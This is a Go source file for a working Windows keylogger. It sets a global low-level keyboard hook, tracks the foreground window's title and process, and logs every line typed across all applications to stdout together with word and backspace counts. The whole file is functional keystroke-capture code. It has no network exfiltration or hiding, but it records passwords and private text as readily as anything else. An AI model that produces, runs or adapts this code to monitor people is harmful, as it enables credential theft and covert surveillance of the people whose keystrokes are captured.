package main

import (
	"os"
	"strings"
	"syscall"
	"time"
	"unsafe"

	gklog "github.com/go-kit/kit/log"
	"github.com/go-kit/kit/log/level"

	"github.com/gonutz/w32/v2"
)

var (
	psapi              = syscall.NewLazyDLL("psapi.dll")
	getProcessFileName = psapi.NewProc("GetProcessImageFileNameW")
)

func main() {

	logger := gklog.NewLogfmtLogger(gklog.NewSyncWriter(os.Stdout))

	winChan := make(chan string)
	processChan := make(chan string)
	go getActiveWindowInfo(winChan, processChan)

	cb := callback{
		logger: logger,
	}

	go cb.updateActiveWindow(winChan, processChan)

	hk := w32.SetWindowsHookEx(w32.WH_KEYBOARD_LL, cb.keyboardCallback, 0, 0)
	defer func() {
		w32.UnhookWindowsHookEx(hk)
	}()
	cb.hook = hk

	var msg w32.MSG
	//It's required to "pump" the message loop
	for w32.GetMessage(&msg, 0, 0, 0) != 0 {

	}
}

func GetProcessFileName(mod w32.HANDLE) string {
	var path [32768]uint16
	ret, _, _ := getProcessFileName.Call(
		uintptr(mod),
		uintptr(unsafe.Pointer(&path[0])),
		uintptr(len(path)),
	)
	if ret == 0 {
		return ""
	}
	return syscall.UTF16ToString(path[:])
}

func getActiveWindowInfo(currentWindow, processWindow chan string) {
	for {
		handle := w32.GetForegroundWindow()
		_, id := w32.GetWindowThreadProcessId(handle)
		ph := w32.OpenProcess(w32.PROCESS_QUERY_INFORMATION, false, uint32(id))
		filename := GetProcessFileName(ph)
		w32.CloseHandle(ph)
		processWindow <- filename
		currentWindow <- w32.GetWindowText(handle)
		time.Sleep(50 * time.Millisecond)
	}
}

type callback struct {
	logger        gklog.Logger
	hook          w32.HHOOK
	activeWindow  string
	activeProcess string
	currentText   string
	backCounter   int
}

func (c *callback) keyboardCallback(nCode int, wparam w32.WPARAM, lParam w32.LPARAM) w32.LRESULT {
	if nCode == 0 && wparam == w32.WM_KEYDOWN {
		k := (*w32.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		switch k.VkCode {
		case w32.VK_CONTROL:
			c.currentText += "[Ctrl]"
		case w32.VK_BACK:
			sz := len(c.currentText)
			if sz > 0 {
				c.currentText = c.currentText[:sz-1]
			}
			c.backCounter++
		case w32.VK_TAB:
			c.currentText += "[Tab]"
		case w32.VK_RETURN:
			words := strings.Split(c.currentText, " ")
			level.Info(c.logger).Log("process", c.activeProcess, "title", c.activeWindow, "words", len(words), "backspace_count", c.backCounter, "text", c.currentText)
			c.currentText = ""
			c.backCounter = 0
		case w32.VK_SHIFT:
			c.currentText += "[Shift]"
		case w32.VK_MENU:
			c.currentText += "[Alt]"
		case w32.VK_CAPITAL:
			c.currentText += "[CapsLock]"
		case w32.VK_ESCAPE:
			c.currentText += "[Esc]"
		case w32.VK_SPACE:
			c.currentText += " "
		case w32.VK_PRIOR:
			c.currentText += "[PageUp]"
		case w32.VK_NEXT:
			c.currentText += "[PageDown]"
		case w32.VK_END:
			c.currentText += "[End]"
		case w32.VK_HOME:
			c.currentText += "[Home]"
		case w32.VK_LEFT:
			c.currentText += "[Left]"
		case w32.VK_UP:
			c.currentText += "[Up]"
		case w32.VK_RIGHT:
			c.currentText += "[Right]"
		case w32.VK_DOWN:
			c.currentText += "[Down]"
		case w32.VK_SELECT:
			c.currentText += "[Select]"
		case w32.VK_PRINT:
			c.currentText += "[Print]"
		case w32.VK_EXECUTE:
			c.currentText += "[Execute]"
		case w32.VK_SNAPSHOT:
			c.currentText += "[PrintScreen]"
		case w32.VK_INSERT:
			c.currentText += "[Insert]"
		case w32.VK_DELETE:
			c.currentText += "[Delete]"
		case w32.VK_HELP:
			c.currentText += "[Help]"
		case w32.VK_LWIN:
			c.currentText += "[LeftWindows]"
		case w32.VK_RWIN:
			c.currentText += "[RightWindows]"
		case w32.VK_APPS:
			c.currentText += "[Applications]"
		case w32.VK_SLEEP:
			c.currentText += "[Sleep]"
		case w32.VK_NUMPAD0:
			c.currentText += "[Pad 0]"
		case w32.VK_NUMPAD1:
			c.currentText += "[Pad 1]"
		case w32.VK_NUMPAD2:
			c.currentText += "[Pad 2]"
		case w32.VK_NUMPAD3:
			c.currentText += "[Pad 3]"
		case w32.VK_NUMPAD4:
			c.currentText += "[Pad 4]"
		case w32.VK_NUMPAD5:
			c.currentText += "[Pad 5]"
		case w32.VK_NUMPAD6:
			c.currentText += "[Pad 6]"
		case w32.VK_NUMPAD7:
			c.currentText += "[Pad 7]"
		case w32.VK_NUMPAD8:
			c.currentText += "[Pad 8]"
		case w32.VK_NUMPAD9:
			c.currentText += "[Pad 9]"
		case w32.VK_MULTIPLY:
			c.currentText += "*"
		case w32.VK_ADD:
			c.currentText += "+"
		case w32.VK_SEPARATOR:
			c.currentText += "[Separator]"
		case w32.VK_SUBTRACT:
			c.currentText += "-"
		case w32.VK_DECIMAL:
			c.currentText += "."
		case w32.VK_DIVIDE:
			c.currentText += "[Devide]"
		case w32.VK_F1:
			c.currentText += "[F1]"
		case w32.VK_F2:
			c.currentText += "[F2]"
		case w32.VK_F3:
			c.currentText += "[F3]"
		case w32.VK_F4:
			c.currentText += "[F4]"
		case w32.VK_F5:
			c.currentText += "[F5]"
		case w32.VK_F6:
			c.currentText += "[F6]"
		case w32.VK_F7:
			c.currentText += "[F7]"
		case w32.VK_F8:
			c.currentText += "[F8]"
		case w32.VK_F9:
			c.currentText += "[F9]"
		case w32.VK_F10:
			c.currentText += "[F10]"
		case w32.VK_F11:
			c.currentText += "[F11]"
		case w32.VK_F12:
			c.currentText += "[F12]"
		case w32.VK_NUMLOCK:
			c.currentText += "[NumLock]"
		case w32.VK_SCROLL:
			c.currentText += "[ScrollLock]"
		case w32.VK_LSHIFT:
			c.currentText += "[LeftShift]"
		case w32.VK_RSHIFT:
			c.currentText += "[RightShift]"
		case w32.VK_LCONTROL:
			c.currentText += "[LeftCtrl]"
		case w32.VK_RCONTROL:
			c.currentText += "[RightCtrl]"
		case w32.VK_LMENU:
			c.currentText += "[LeftAlt]"
		case w32.VK_RMENU:
			c.currentText += "[RightAlt]"
		case w32.VK_OEM_1:
			c.currentText += ";"
		case w32.VK_OEM_2:
			c.currentText += "/"
		case w32.VK_OEM_3:
			c.currentText += "`"
		case w32.VK_OEM_4:
			c.currentText += "["
		case w32.VK_OEM_5:
			c.currentText += "\\"
		case w32.VK_OEM_6:
			c.currentText += "]"
		case w32.VK_OEM_7:
			c.currentText += "'"
		case w32.VK_OEM_PERIOD:
			c.currentText += "."
		case 0x30:
			c.currentText += "0"
		case 0x31:
			c.currentText += "1"
		case 0x32:
			c.currentText += "2"
		case 0x33:
			c.currentText += "3"
		case 0x34:
			c.currentText += "4"
		case 0x35:
			c.currentText += "5"
		case 0x36:
			c.currentText += "6"
		case 0x37:
			c.currentText += "7"
		case 0x38:
			c.currentText += "8"
		case 0x39:
			c.currentText += "9"
		case 0x41:
			c.currentText += "a"
		case 0x42:
			c.currentText += "b"
		case 0x43:
			c.currentText += "c"
		case 0x44:
			c.currentText += "d"
		case 0x45:
			c.currentText += "e"
		case 0x46:
			c.currentText += "f"
		case 0x47:
			c.currentText += "g"
		case 0x48:
			c.currentText += "h"
		case 0x49:
			c.currentText += "i"
		case 0x4A:
			c.currentText += "j"
		case 0x4B:
			c.currentText += "k"
		case 0x4C:
			c.currentText += "l"
		case 0x4D:
			c.currentText += "m"
		case 0x4E:
			c.currentText += "n"
		case 0x4F:
			c.currentText += "o"
		case 0x50:
			c.currentText += "p"
		case 0x51:
			c.currentText += "q"
		case 0x52:
			c.currentText += "r"
		case 0x53:
			c.currentText += "s"
		case 0x54:
			c.currentText += "t"
		case 0x55:
			c.currentText += "u"
		case 0x56:
			c.currentText += "v"
		case 0x57:
			c.currentText += "w"
		case 0x58:
			c.currentText += "x"
		case 0x59:
			c.currentText += "y"
		case 0x5A:
			c.currentText += "z"
		}
	}
	return w32.CallNextHookEx(c.hook, nCode, wparam, lParam)
}

func (c *callback) updateActiveWindow(winChan, processChan chan string) {
	for {
		select {
		case w := <-winChan:
			c.activeWindow = w
		case p := <-processChan:
			c.activeProcess = p
		}
	}
}